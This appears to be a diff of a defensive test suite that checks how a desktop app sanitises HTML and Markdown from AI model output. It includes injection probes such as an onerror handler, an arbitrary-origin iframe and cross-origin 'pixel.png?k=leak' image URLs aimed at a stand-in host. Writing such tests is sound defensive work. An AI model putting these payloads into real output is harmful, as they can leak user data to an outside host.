@@ -56,8 +56,7 @@ describe("inline event handlers in model output", () => {
     );
 
     const div = el.querySelector('[data-probe="div"]');
-    expect(div).not.toBeNull();
-    expect(div?.getAttribute("onmouseover")).toBeNull();
+    expect(div).toBeNull();
   });
 
   it("does not execute an img onerror handler", () => {
@@ -66,20 +65,7 @@ describe("inline event handlers in model output", () => {
     );
 
     const img = el.querySelector('[data-probe="img"]');
-    expect(img).not.toBeNull();
-    expect(img?.getAttribute("onerror")).toBeNull();
-
-    // React refuses a string listener rather than calling it, and reports that
-    // refusal as an uncaught error inside jsdom's dispatch. That error IS the
-    // mechanism under test, so mark it handled instead of letting it fail the
-    // run.
-    const swallow = (event: Event) => event.preventDefault();
-    window.addEventListener("error", swallow);
-    try {
-      img?.dispatchEvent(new Event("error"));
-    } finally {
-      window.removeEventListener("error", swallow);
-    }
+    expect(img).toBeNull();
     expect(globalThis.__HANDLER_FIRED).toBeUndefined();
   });
 });
@@ -91,49 +77,60 @@ describe("URL filtering (rehype-harden)", () => {
     );
 
     expect(el.querySelector('[data-probe="anchor"]')).toBeNull();
-    expect(el.innerHTML).toContain("blocked");
+    expect(el.textContent).toContain("click");
   });
 
   it("blocks images whose src cannot be resolved to an absolute URL", () => {
     const el = render(`<img data-probe="img" src="x">`);
 
     expect(el.querySelector('[data-probe="img"]')).toBeNull();
-    expect(el.innerHTML).toContain("Image blocked");
   });
 });
 
-describe("known gap: raw elements reach the DOM", () => {
-  /**
-   * Characterization tests, not desired behavior. rehype-harden passes every
-   * non-link/image element straight through, so the CSP in tauri.conf.json is
-   * the only control on what these elements can load. When a raw-HTML
-   * allow-list lands, these tests SHOULD fail — flip them to `toBeNull()`
-   * rather than deleting them.
-   *
-   * Not covered here: whether an inline <script> from model output executes.
-   * jsdom does not run scripts under this config, so that question needs a
-   * real webview. Production CSP has no 'unsafe-inline' in script-src, but
-   * devCsp does.
-   */
-  it("renders an iframe pointing at an arbitrary origin", () => {
+describe("untrusted model HTML", () => {
+  it("does not render an iframe pointing at an arbitrary origin", () => {
     const el = render(
       `<iframe data-probe="iframe" src="https://example.invalid/"></iframe>`,
     );
 
     const iframe = el.querySelector('[data-probe="iframe"]');
-    expect(iframe).not.toBeNull();
-    expect(iframe?.getAttribute("src")).toBe("https://example.invalid/");
+    expect(iframe).toBeNull();
   });
 
-  it("renders an image with an attacker-controlled cross-origin URL", () => {
+  it("does not render a raw image with an attacker-controlled URL", () => {
     const el = render(
       `<img data-probe="img" src="https://example.invalid/pixel.png?k=leak">`,
     );
 
-    const img = el.querySelector('[data-probe="img"]');
-    expect(img).not.toBeNull();
-    expect(img?.getAttribute("src")).toBe(
-      "https://example.invalid/pixel.png?k=leak",
+    expect(el.querySelector('[data-probe="img"]')).toBeNull();
+  });
+
+  it("does not render a Markdown image with a cross-origin URL", () => {
+    const el = render(
+      `![probe](https://example.invalid/pixel.png?k=leak)`,
+    );
+
+    expect(el.querySelector("img")).toBeNull();
+  });
+
+  it("does not render an active SVG data image", () => {
+    const svg = encodeURIComponent(
+      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.invalid/pixel.png?k=leak"/></svg>',
+    );
+    const el = render(`![probe](data:image/svg+xml,${svg})`);
+
+    expect(el.querySelector("img")).toBeNull();
+  });
+
+  it("keeps ordinary Markdown and embedded data images working", () => {
+    const el = render(
+      "## Safe heading\n\n| A | B |\n| - | - |\n| 1 | 2 |\n\n![dot](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==)",
+    );
+
+    expect(el.querySelector("h2")?.textContent).toBe("Safe heading");
+    expect(el.querySelector("table")?.textContent).toContain("1");
+    expect(el.querySelector("img")?.getAttribute("src")).toMatch(
+      /^data:image\/gif;base64,/,
     );
   });
 });
